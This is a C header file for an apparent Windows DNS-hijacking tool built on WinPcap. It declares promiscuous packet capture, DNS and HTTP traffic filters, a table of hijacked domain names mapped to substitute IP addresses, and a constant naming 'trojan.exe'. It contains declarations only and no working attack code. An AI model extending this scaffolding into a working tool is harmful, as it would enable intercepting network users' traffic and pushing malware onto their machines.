
#ifndef PUBLIC_H_H_H
#define PUBLIC_H_H_H

#include <windows.h>
#define LOGFILENAME						"log.txt"

#define MAX_DNS_DOMAIN_NAME_SPLIT_SIZE	64
#define PCAP_OPENFLAG_PROMISCUOUS		1
#define MAX_PACKET_SIZE					0x10000						
#define MTU								1500
#define MAC_ADDRESS_SIZE				6	
#define HTTP_PORT						80
#define DNS_PORT						53
#define MAX_DNS_HIJACK_COUNT			4096
#define WSASTARTUP_VERSION				0x0202

#define TROJAN_FILE_NAME					"trojan.exe"
#define PCAP_OPEN_LIVE_TO_MS_VALUE_NEGTIVE	-1
#define PCAP_OPEN_LIVE_TO_MS_VALUE_0		0
#define WINPCAP_MAX_BUFFER_SIZE				100*0x100000
#define DNS_PACKET_LIMIT					512
#define DNS_INIT_FILENAME			"ini.txt"
//#define PCAP_DNS_PORT_FILTER		"udp"
#define PCAP_DNS_PORT_FILTER		"udp dst port 53 or udp src port 53"
//#define PCAP_DNS_PORT_FILTER		"ip"
#define PCAP_HTTP_PORT_FILTER		"tcp dst port 80"

extern DWORD		gLocalIPAddr;
extern char			gHijackDnsName[MAX_DNS_HIJACK_COUNT][MAX_PATH];
extern DWORD		gHijackDnsNameCnt;
extern DWORD		gHijackDnsIP[MAX_DNS_HIJACK_COUNT];

DWORD GetLocalIpAddress();
DWORD WriteLogFile(char * pFileName,char * pData,DWORD dwDataSize);
DWORD WriteLogFile(char * pData);
int RecordInFile(char * szFileName,unsigned char * strBuffer,int iCounter);
#endif